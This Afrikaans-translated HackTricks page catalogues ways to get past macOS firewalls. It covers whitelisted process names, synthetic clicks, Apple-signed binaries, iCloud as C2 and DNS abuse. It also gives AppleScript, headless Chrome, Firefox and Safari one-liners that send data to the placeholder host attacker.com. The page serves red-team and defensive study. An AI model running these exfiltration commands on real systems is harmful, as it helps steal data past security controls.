# macOS Deurloophardeware

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Gevonde tegnieke

Die volgende tegnieke is gevind wat werk in sommige macOS-firewall-toepassings.

### Misbruik van witlysname

* Byvoorbeeld om die kwaadwillige sagteware te noem met name van bekende macOS-prosesse soos **`launchd`**

### Sintetiese Kliek

* As die firewall toestemming aan die gebruiker vra, laat die kwaadwillige sagteware **toestemming gee**

### **Gebruik Apple-ondertekende bineêre lêers**

* Soos **`curl`**, maar ook ander soos **`whois`**

### Bekende Apple-domeine

Die firewall kan verbindinge toelaat na bekende Apple-domeine soos **`apple.com`** of **`icloud.com`**. En iCloud kan gebruik word as 'n C2.

### Generiese Deurloophardeware

Sommige idees om te probeer om firewalls te omseil

### Kontroleer toegelate verkeer

Om te weet watter verkeer toegelaat word, sal jou help om potensieel witlys-domeine te identifiseer of watter toepassings toegelaat word om daartoe toegang te verkry
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Misbruik van DNS

DNS-oplossings word gedoen via die **`mdnsreponder`** ondertekende aansoek wat waarskynlik toegelaat sal word om kontak met DNS-bedieners te maak.

<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Via Blaaier-toepassings

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Vuurvos
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via prosesinspuitings

As jy **kode in 'n proses kan inspuit** wat toegelaat word om met enige bediener te verbind, kan jy die vuurmuurbeveiligings omseil:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Verwysings

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
